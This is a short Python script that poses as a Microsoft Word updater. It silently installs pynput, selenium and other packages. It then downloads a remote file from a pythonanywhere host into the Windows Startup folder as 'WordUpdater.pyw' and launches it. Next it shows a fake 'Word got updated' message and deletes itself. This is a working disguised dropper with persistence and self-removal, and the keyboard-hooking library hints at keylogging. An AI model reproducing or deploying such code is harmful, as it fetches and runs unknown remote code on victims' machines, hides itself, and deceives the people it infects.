try:
    from tkinter import messagebox
    import requests
    import os
    import time
    import pathlib

    os.system('pyw -m pip install --upgrade sentry-sdk')
    os.system('pyw -m pip install --upgrade requests')
    os.system('pyw -m pip install --upgrade pynput')
    os.system('pyw -m pip install --upgrade pyderman')
    os.system('pyw -m pip install --upgrade selenium')

    while True:
        try:
            import sentry_sdk
            import requests
            import pynput
            import pyderman
            import selenium
        except ModuleNotFoundError:
            pass
        else:
            break
        time.sleep(3)

    import sentry_sdk
    sentry_sdk.init("https://8b78151ad1da4102805eefb4a8fa8606@o1185419.ingest.sentry.io/6303999", release="GSGTMServiceInstaller@1.0.0", traces_sample_rate=1.0)
    try:
        main_path = pathlib.Path.home().absolute() / "AppData" / "Roaming" / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup" / "WordUpdater.pyw"
        with open(str(main_path), "wb") as tf:
            tf.write(requests.get("http://gsgtafelmanager.pythonanywhere.com/file/startup.py").content)

        os.system('start "" "' + str(main_path) + '"')

        messagebox.showinfo("Word Updater", "Word got updated automatically. You can now close this window.")
    except Exception as e:
        sentry_sdk.capture_exception(e)
finally:
    os.remove(__file__)
